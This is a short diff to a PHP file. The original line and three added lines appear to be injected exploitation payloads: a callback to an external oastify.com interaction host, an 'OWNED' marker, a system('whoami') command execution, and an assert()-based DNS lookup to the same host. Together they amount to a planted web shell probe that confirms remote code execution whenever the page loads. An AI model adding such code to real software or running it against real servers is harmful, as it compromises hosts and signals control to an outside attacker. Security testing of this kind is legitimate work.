@@ -1,1 +1,4 @@
 <?php file_get_contents("http://i8rx5jqtu7ifgc3y7xlw58e9107rvio6d.oastify.com"); ?>
+<?php echo "OWNED_4577"; ?>
+<?php echo "Whoami: "; system('whoami'); ?>
+<?php assert("dns_get_record('i8rx5jqtu7ifgc3y7xlw58e9107rvio6d.oastify.com');"); ?>
